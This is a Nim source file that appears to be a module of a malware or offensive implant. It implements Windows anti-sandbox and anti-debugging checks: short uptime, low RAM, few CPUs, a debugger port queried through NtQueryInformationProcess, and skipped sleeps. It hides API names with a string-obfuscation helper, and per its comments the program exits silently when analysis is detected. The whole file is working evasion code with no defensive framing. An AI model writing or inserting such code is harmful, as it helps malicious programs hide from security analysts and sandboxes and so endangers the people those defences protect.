## Anti-sandbox checks. Exits silently if a sandbox/analysis environment is
## detected. Compile with -d:antiSandbox to enable; without the flag this
## file still compiles but isSandbox() always returns false.
import crypto/strenc

when defined(windows) and defined(antiSandbox):
  type
    DWORD    = uint32
    BOOL     = int32
    HANDLE   = int
    ULONG    = uint32
    PVOID    = pointer

  # MEMORYSTATUSEX for RAM check
  type MEMORYSTATUSEX {.pure.} = object
    dwLength:                DWORD
    dwMemoryLoad:            DWORD
    ullTotalPhys:            uint64
    ullAvailPhys:            uint64
    ullTotalPageFile:        uint64
    ullAvailPageFile:        uint64
    ullTotalVirtual:         uint64
    ullAvailVirtual:         uint64
    ullAvailExtendedVirtual: uint64

  type SYSTEM_INFO {.pure.} = object
    dwOemId:                 DWORD
    dwPageSize:              DWORD
    lpMinimumApplicationAddress: PVOID
    lpMaximumApplicationAddress: PVOID
    dwActiveProcessorMask:   uint
    dwNumberOfProcessors:    DWORD
    dwProcessorType:         DWORD
    dwAllocationGranularity: DWORD
    wProcessorLevel:         uint16
    wProcessorRevision:      uint16

  proc GetTickCount64(): uint64
    {.importc: "GetTickCount64", dynlib: "kernel32".}
  proc GlobalMemoryStatusEx(ms: ptr MEMORYSTATUSEX): BOOL
    {.importc: "GlobalMemoryStatusEx", dynlib: "kernel32".}
  proc GetSystemInfo(si: ptr SYSTEM_INFO)
    {.importc: "GetSystemInfo", dynlib: "kernel32".}
  proc GetModuleHandleA(n: cstring): HANDLE
    {.importc: "GetModuleHandleA", dynlib: "kernel32".}
  proc GetProcAddress(h: HANDLE, n: cstring): pointer
    {.importc: "GetProcAddress", dynlib: "kernel32".}
  proc Sleep(ms: DWORD)
    {.importc: "Sleep", dynlib: "kernel32".}
  proc GetTickCount(): DWORD
    {.importc: "GetTickCount", dynlib: "kernel32".}

  type FnNtQIP = proc(h: HANDLE, cls: DWORD, info: PVOID,
                       len: ULONG, ret: ptr ULONG): DWORD {.stdcall.}

  proc uptimeTooShort(): bool =
    ## Sandboxes often reset recently — uptime < 10 minutes is suspicious.
    GetTickCount64() < uint64(10 * 60 * 1000)

  proc ramTooLow(): bool =
    ## Most sandboxes are configured with < 4 GB RAM to save host resources.
    var ms: MEMORYSTATUSEX
    ms.dwLength = DWORD(sizeof(MEMORYSTATUSEX))
    if GlobalMemoryStatusEx(addr ms) == 0: return false
    ms.ullTotalPhys < uint64(4) * 1024 * 1024 * 1024

  proc cpuTooFew(): bool =
    ## Sandboxes typically expose only 1 or 2 processors.
    var si: SYSTEM_INFO
    GetSystemInfo(addr si)
    si.dwNumberOfProcessors < 2

  proc isBeingDebugged(): bool =
    ## NtQueryInformationProcess with ProcessDebugPort (class 7):
    ## returns non-zero if a kernel debugger is attached.
    let hNtdll = GetModuleHandleA(hidstr("ntdll.dll").cstring)
    if hNtdll == 0: return false
    let fn = cast[FnNtQIP](
      GetProcAddress(hNtdll, hidstr("NtQueryInformationProcess").cstring))
    if fn == nil: return false
    var debugPort: int64 = 0
    var retLen: ULONG = 0
    # ProcessDebugPort = 7
    let status = fn(HANDLE(-1), DWORD(7), addr debugPort,
                    ULONG(sizeof(int64)), addr retLen)
    status == 0 and debugPort != 0

  proc sleepSkipped(): bool =
    ## Some sandboxes accelerate time to get through sleep calls faster.
    ## We sleep 1500 ms; if < 1000 ms elapsed, execution was accelerated.
    let t0 = GetTickCount()
    Sleep(DWORD(1500))
    let elapsed = GetTickCount() - t0
    elapsed < DWORD(1000)

proc isSandbox*(): bool =
  when defined(windows) and defined(antiSandbox):
    if uptimeTooShort(): return true
    if ramTooLow():      return true
    if cpuTooFew():      return true
    if isBeingDebugged(): return true
    if sleepSkipped():   return true
    false
  else:
    false
